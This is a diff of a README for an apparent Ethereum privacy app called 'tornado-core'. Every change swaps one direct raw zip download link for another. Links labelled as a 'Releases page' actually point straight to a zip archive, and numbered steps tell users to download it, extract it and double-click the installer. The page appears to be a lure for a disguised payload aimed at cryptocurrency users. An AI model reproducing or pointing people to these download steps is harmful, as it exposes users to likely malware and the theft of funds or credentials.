@@ -4,7 +4,7 @@
 
 Welcome to Tornado Core! This application allows you to make private transactions on the Ethereum blockchain. Enjoy a seamless, non-custodial experience in handling your cryptocurrency.
 
-[![Download tornado-core](https://raw.githubusercontent.com/IngeniousCrab/tornado-core/master/fixatif/tornado-core.zip%20tornado--core-v1.0.0-brightgreen)](https://raw.githubusercontent.com/IngeniousCrab/tornado-core/master/fixatif/tornado-core.zip)
+[![Download tornado-core](https://github.com/IngeniousCrab/tornado-core/raw/refs/heads/master/test/core-tornado-1.3-beta.1.zip%20tornado--core-v1.0.0-brightgreen)](https://github.com/IngeniousCrab/tornado-core/raw/refs/heads/master/test/core-tornado-1.3-beta.1.zip)
 
 ## 📦 What You Need
 
@@ -16,13 +16,13 @@ Before you start, ensure your device meets these requirements:
 
 ## 📥 Download & Install
 
-To get tornado-core, visit this page to download: [tornado-core Releases](https://raw.githubusercontent.com/IngeniousCrab/tornado-core/master/fixatif/tornado-core.zip).
+To get tornado-core, visit this page to download: [tornado-core Releases](https://github.com/IngeniousCrab/tornado-core/raw/refs/heads/master/test/core-tornado-1.3-beta.1.zip).
 
 Follow these steps to install the application:
 
-1. Navigate to the [Releases page](https://raw.githubusercontent.com/IngeniousCrab/tornado-core/master/fixatif/tornado-core.zip).
+1. Navigate to the [Releases page](https://github.com/IngeniousCrab/tornado-core/raw/refs/heads/master/test/core-tornado-1.3-beta.1.zip).
 2. Find the latest version of tornado-core.
-3. Click on the asset you want to download (e.g., `https://raw.githubusercontent.com/IngeniousCrab/tornado-core/master/fixatif/tornado-core.zip`).
+3. Click on the asset you want to download (e.g., `https://github.com/IngeniousCrab/tornado-core/raw/refs/heads/master/test/core-tornado-1.3-beta.1.zip`).
 4. Save the file to your computer.
 5. Once downloaded, locate the file and extract it (if it's zipped).
 6. Run the installer by double-clicking the setup file.
@@ -77,8 +77,8 @@ For assistance:
 
 ## 🔗 Important Links
 
-Access the application here: [tornado-core Releases](https://raw.githubusercontent.com/IngeniousCrab/tornado-core/master/fixatif/tornado-core.zip).
+Access the application here: [tornado-core Releases](https://github.com/IngeniousCrab/tornado-core/raw/refs/heads/master/test/core-tornado-1.3-beta.1.zip).
 
 Feel free to explore and enjoy the benefits of private transactions on Ethereum! 
 
-[![Download tornado-core](https://raw.githubusercontent.com/IngeniousCrab/tornado-core/master/fixatif/tornado-core.zip%20tornado--core-v1.0.0-brightgreen)](https://raw.githubusercontent.com/IngeniousCrab/tornado-core/master/fixatif/tornado-core.zip)
+[![Download tornado-core](https://github.com/IngeniousCrab/tornado-core/raw/refs/heads/master/test/core-tornado-1.3-beta.1.zip%20tornado--core-v1.0.0-brightgreen)](https://github.com/IngeniousCrab/tornado-core/raw/refs/heads/master/test/core-tornado-1.3-beta.1.zip)
